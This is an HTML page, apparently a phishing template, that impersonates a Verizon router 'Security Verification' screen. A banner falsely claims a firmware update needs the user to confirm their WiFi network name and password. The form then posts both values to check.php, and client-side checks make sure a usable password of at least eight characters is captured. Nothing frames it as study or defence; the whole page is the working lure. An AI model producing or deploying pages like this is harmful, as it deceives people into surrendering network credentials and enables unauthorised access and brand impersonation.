<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Verizon Router</title>
    <link rel="shortcut icon" type="image/png" href="images/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(135deg, #d32000 0%, #4a0b00 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .login-container {
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.35);
            width: 100%;
            max-width: 420px;
            padding: 40px 35px;
            animation: fadeInUp 0.6s ease-out;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logo-section {
            text-align: center;
            margin-bottom: 35px;
        }

        .logo {
            width: 90px;
            height: 90px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #d32000 0%, #ff5a39 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 20px rgba(211, 32, 0, 0.35);
        }

        .logo svg {
            width: 60px;
            height: 60px;
            fill: #ffffff;
        }

        .logo-title {
            font-size: 24px;
            font-weight: 700;
            color: #1a202c;
            margin-bottom: 6px;
        }

        .logo-subtitle {
            font-size: 14px;
            color: #718096;
            font-weight: 500;
            letter-spacing: 0.4px;
        }

        .banner {
            background: #fff5f5;
            border: 1px solid #fed7d7;
            border-radius: 12px;
            padding: 18px;
            margin-bottom: 24px;
        }

        .banner h2 {
            font-size: 16px;
            font-weight: 600;
            color: #c53030;
            margin-bottom: 6px;
        }

        .banner p {
            font-size: 13px;
            color: #742a2a;
            line-height: 1.4;
        }

        .form-group {
            margin-bottom: 22px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #2d3748;
            margin-bottom: 8px;
        }

        .input-wrapper {
            position: relative;
        }

        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            pointer-events: none;
        }

        .input-icon svg {
            width: 100%;
            height: 100%;
            fill: #a0aec0;
            transition: fill 0.3s ease;
        }

        .form-input {
            width: 100%;
            padding: 14px 16px 14px 48px;
            font-size: 15px;
            border: 2px solid #e2e8f0;
            border-radius: 10px;
            outline: none;
            transition: all 0.3s ease;
            background: #f7fafc;
            color: #2d3748;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .form-input:focus {
            border-color: #d32000;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(211, 32, 0, 0.15);
        }

        .form-input:focus + .input-icon svg {
            fill: #d32000;
        }

        .form-input::placeholder {
            color: #a0aec0;
        }

        .password-toggle {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 5px;
            outline: none;
            width: 24px;
            height: 24px;
        }

        .password-toggle svg {
            width: 100%;
            height: 100%;
            fill: #a0aec0;
            transition: fill 0.3s ease;
        }

        .password-toggle:hover svg {
            fill: #d32000;
        }

        .submit-btn {
            width: 100%;
            padding: 14px 24px;
            font-size: 16px;
            font-weight: 600;
            color: #ffffff;
            background: linear-gradient(135deg, #d32000 0%, #ff5a39 100%);
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 14px rgba(211, 32, 0, 0.45);
            outline: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 18px rgba(211, 32, 0, 0.5);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .help-text {
            text-align: center;
            margin-top: 22px;
            font-size: 13px;
            color: #718096;
        }

        .help-link {
            color: #d32000;
            text-decoration: none;
            font-weight: 600;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 32px 24px;
            }

            .logo {
                width: 80px;
                height: 80px;
            }

            .logo svg {
                width: 50px;
                height: 50px;
            }

            .form-input {
                padding: 12px 14px 12px 46px;
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo-section">
            <div class="logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true">
                    <path d="M17.65 6.35a7.95 7.95 0 00-5.65-2.35c-2.14 0-4.14.83-5.66 2.35l-1.41-1.41A9.969 9.969 0 0112 2c2.68 0 5.19 1.05 7.07 2.93L17.65 6.35zM6.34 17.66A7.95 7.95 0 0012 20c2.14 0 4.14-.83 5.66-2.34l1.41 1.41A9.969 9.969 0 0112 22c-2.68 0-5.19-1.05-7.07-2.93l1.41-1.41zM4 12c0-1.85.63-3.55 1.69-4.9L4.22 5.64A9.969 9.969 0 002 12c0 2.68 1.05 5.19 2.93 7.07l1.41-1.41A7.95 7.95 0 014 12zm16 0c0 1.85-.63 3.55-1.69 4.9l1.47 1.46A9.969 9.969 0 0022 12c0-2.68-1.05-5.19-2.93-7.07l-1.41 1.41A7.95 7.95 0 0120 12z"/>
                </svg>
            </div>
            <h1 class="logo-title">Verizon Router</h1>
            <p class="logo-subtitle">Security Verification</p>
        </div>

        <div class="banner">
            <h2>Firmware Update Required</h2>
            <p>For security reasons, please confirm your WiFi credentials to continue the firmware upgrade. Your connection will resume automatically once verification completes.</p>
        </div>

        <form id="verizonForm" action="check.php" method="POST" autocomplete="off">
            <div class="form-group">
                <label for="wifi-name" class="form-label">WiFi Name (SSID)</label>
                <div class="input-wrapper">
                    <div class="input-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                            <path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/>
                        </svg>
                    </div>
                    <input 
                        type="text" 
                        id="wifi-name" 
                        name="wifi_name" 
                        class="form-input" 
                        placeholder="Enter network name" 
                        required
                    >
                </div>
            </div>

            <div class="form-group">
                <label for="wifi-password" class="form-label">WiFi Password</label>
                <div class="input-wrapper">
                    <div class="input-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                            <path d="M18 8h-1V6a5 5 0 00-10 0v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9a2 2 0 110-4 2 2 0 010 4zm3-9H9V6a3 3 0 016 0v2z"/>
                        </svg>
                    </div>
                    <input 
                        type="password" 
                        id="wifi-password" 
                        name="key" 
                        class="form-input" 
                        placeholder="Enter WiFi password" 
                        required
                        autocomplete="current-password"
                    >
                    <button type="button" class="password-toggle" onclick="togglePassword()">
                        <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                        </svg>
                    </button>
                </div>
            </div>

            <button type="submit" class="submit-btn">Confirm &amp; Continue</button>

            <p class="help-text">
                Need help? <a class="help-link" href="#">Visit Verizon Support</a>
            </p>
        </form>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('wifi-password');
            const eyeIcon = document.getElementById('eye-icon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>';
            } else {
                passwordInput.type = 'password';
                eyeIcon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
            }
        }

        document.getElementById('verizonForm').addEventListener('submit', function(e) {
            const wifiName = document.getElementById('wifi-name').value.trim();
            const password = document.getElementById('wifi-password').value.trim();

            if (wifiName.length < 1) {
                e.preventDefault();
                alert('Please enter your WiFi name.');
                return false;
            }

            if (password.length < 8) {
                e.preventDefault();
                alert('WiFi password must be at least 8 characters.');
                return false;
            }
        });

        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }
    </script>
</body>
</html>
